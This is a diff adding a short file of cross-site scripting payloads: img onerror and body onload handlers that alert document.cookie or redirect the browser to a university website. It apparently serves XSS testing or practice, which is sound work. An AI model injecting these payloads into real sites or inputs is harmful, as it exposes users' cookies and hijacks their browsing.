@@ -1,0 +1,7 @@
+<img src=sd onerror=alert(document.cookie)>
+
+<img src=sd onerror=alert(window.location.assign("http://www.ufrpe.br/"))>
+
+<body onload=alert(window.location.assign("http://www.ufrpe.br/"))>
+
+<body onload=console.log(window.location.assign("http://www.ufrpe.br/"))>
